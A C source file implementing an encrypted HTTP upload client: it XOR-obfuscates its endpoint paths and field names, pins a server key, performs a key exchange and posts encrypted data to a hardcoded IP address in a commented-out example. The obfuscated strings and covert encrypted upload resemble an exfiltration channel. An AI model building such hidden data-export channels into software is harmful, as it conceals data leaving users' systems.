#include "fetch.h"

// TODO: add certificate pinning

char *fetch(Data data, int pinned_public_key)
{
	char *alpha_post_string = stitch(data.post.alpha);
	// XOR: /master_keys
	char *server_keys_str = makeHttpPostRequest(data.host, data.port, fheXOR("490815101c03172b080d1f165b", fXOR("56'0;", 'S')), alpha_post_string);
	if (server_keys_str == NULL)
	{
		free(alpha_post_string);
		return NULL;
	}

	free(alpha_post_string);

	ServerKeys server_keys = deserializeServerKeys(server_keys_str);
	if (!server_keys.public_key_base64)
	{
		return NULL;
	}

	if (fhash(server_keys.public_key_base64, strlen(server_keys.public_key_base64)) != pinned_public_key)
	{
		return NULL;
	}

	free(server_keys_str);

	KeyStore keystore = genKeyStore();
	genSharedKey(&keystore, server_keys);

	Dict beta[] = {
		{data.post.alpha->key, data.post.alpha->value},
		{fheXOR("1610160f01053a1f0611", fXOR("56'0;", 'S')), keystore.public_key_base64},				 // public key: key fetch
		{fheXOR("150c130d371610160f01053a1f0611", fXOR("56'0;", 'S')), keystore.sign_public_key_base64}, // sign_public key: key fetch
		{NULL, NULL}};

	char *beta_post_string = stitch(beta);
	// XOR: /hawk_keys
	char *beta_response = makeHttpPostRequest(data.host, data.port, fheXOR("490d151403390e111a1b49", fXOR("56'0;", 'S')), beta_post_string);
	if (beta_response == NULL)
	{
		free(beta_post_string);
		return NULL;
	}

	free(beta_post_string);

	Carrier *carrier = deserializeNetworkCarrier(&keystore, &server_keys, beta_response);

	if (carrier->body == NULL)
	{
		free(carrier);
		return NULL;
	}
	free(beta_response);
	free(carrier);

	char *omega_encrypted_string = boxEncrypt(keystore, data.post.omega);

	Dict hades[] = {
		{data.post.alpha->key, data.post.alpha->value},
		{fheXOR("02040002", fXOR("56'0;", 'S')), omega_encrypted_string}, // data: key fetch
		{NULL, NULL}};

	char *hades_str = stitch(hades);

	char *omega_response = makeHttpPostRequest(data.host, data.port, data.endpoint, hades_str);
	if (!omega_response)
	{
		return NULL;
	}

	free(omega_encrypted_string);
	free(hades_str);

	return omega_response;
}

/*
int main()
{
   Dict alpha[] = {
	   {"hawkid", "1024-25987"},
	   {NULL, NULL}};
   Dict omega[] = {
	   {"kdata", "large data"},
	   {NULL, NULL}};

   Post post = {
	   alpha, NULL, omega};

   Data data = {
	   "34.31.103.70",
	   "/flight/nest/",
	   3000,
	   post};

   char *res = fetch(data, 10000000);
   printf("Res: %s\n", res);
   return 0;
}*/